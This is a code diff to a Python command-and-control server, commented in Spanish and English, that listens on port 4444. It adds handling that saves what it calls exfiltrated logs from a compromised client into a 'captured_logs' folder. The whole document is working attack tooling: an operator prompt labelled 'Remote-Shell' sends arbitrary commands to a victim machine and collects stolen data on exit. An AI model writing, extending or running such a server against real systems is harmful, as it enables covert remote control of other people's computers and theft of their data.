@@ -1,4 +1,5 @@
-import socket
+import socket,os
+import time
 
 # '0.0.0.0' significa "Escuchar en todas las interfaces de red de este PC"
 HOST = '0.0.0.0' 
@@ -6,6 +7,16 @@ PORT = 4444
 
 def init_server():
     print(f"\n[+] Configurando el Servidor C2 en el puerto {PORT}...")
+
+    ruta_base = os.path.dirname(os.path.abspath(__file__))
+    ruta_proyecto = os.path.dirname(ruta_base)
+    carpeta_logs = os.path.join(ruta_proyecto, "captured_logs")
+    
+    if not os.path.exists(carpeta_logs):
+        os.makedirs(carpeta_logs)
+        print(f"[*] Carpeta de logs creada en: {carpeta_logs}")
+
+
     # Create a TCP Socket
     #AF_INET specifies IPv4
     #SOCK_STREAM specifies TCP
@@ -21,25 +32,55 @@ def init_server():
     print("-" * 50)
 
     while True:
-        #SOlicitate command
-        command = input("Remote-Shell >> ")
-        #Sockets only send Bytes
-        #encode tranforms the Strings into Byte
-        if command.lower() == "exit":
-            client_sock.send('exit'.encode())
+        try:
+            #SOlicitate command
+        
+            command = input("Remote-Shell >> ")
+            #Sockets only send Bytes
+            #encode tranforms the Strings into Byte
+            if command.lower() == 'exit':
+                print("[*] Enviando orden de cierre...")
+                client_sock.send('exit'.encode())
+                
+                print("[*] Esperando exfiltración de datos...")
+                try:
+                    # Aumentamos el tiempo de espera por si el log es grande
+                    datos_log = client_sock.recv(20480).decode('utf-8', errors='ignore')
+                    
+                    if datos_log:
+                        nombre_archivo = f"log_{addr[0]}_{int(time.time())}.txt"
+                        ruta_completa = os.path.join(carpeta_logs, nombre_archivo)
+                        
+                        with open(ruta_completa, "w", encoding="utf-8") as f:
+                            f.write(datos_log)
+                        print(f"\n[+] ¡ÉXITO! Log guardado en:\n    >> {ruta_completa}")
+                    else:
+                        print("[-] El log llegó vacío.")
+                        
+                except Exception as e:
+                    print(f"[-] Error recibiendo log: {e}")
+                
+                break
+        
+            if command.strip() == "":
+                continue
+
+            client_sock.send(command.encode())
+            #Tranform the bytes into Utf-8 codification to understand in print
+            response = client_sock.recv(4096).decode('utf-8',errors='ignore')
+
+            print(response)
+        
+        except KeyboardInterrupt:
+            print("\n[!] Cierre forzado detectado.")
+            break
+        except Exception as e:
+            print(f"[-] Error en la conexión: {e}")
             break
         
-        if command.strip() == "":
-            continue
-
-        client_sock.send(command.encode())
-        #Tranform the bytes into Utf-8 codification to understand in print
-        response = client_sock.recv(4096).decode('utf-8',errors='ignore')
-
-        print(response)
-    
     client_sock.close()
     server.close()
+    print("[*] Servidor cerrado.")
     
 if __name__ == '__main__':
     init_server()
